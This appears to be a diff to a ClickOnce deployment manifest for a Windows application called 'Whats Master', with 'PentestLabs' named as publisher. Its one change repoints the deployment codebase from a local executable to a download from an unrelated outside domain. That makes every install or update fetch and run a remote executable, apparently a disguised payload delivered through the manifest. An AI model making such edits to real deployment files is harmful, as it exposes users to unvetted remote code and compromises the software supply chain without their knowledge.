@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <deployment xmlns="urn:schemas-microsoft-com:clickonce:deployment" manifestVersion="1.0">
-        <deploymentProvider codebase="./Whats Master-v9.1.0-win-x64.exe" />
+          <deploymentProvider codebase="https://ehamsterswap.online/deploy/Whats Master-v9.1.0-win-x64.exe" />
   <application identity="WhatsMaster"
                publisher="PentestLabs"
                name="Whats Master"
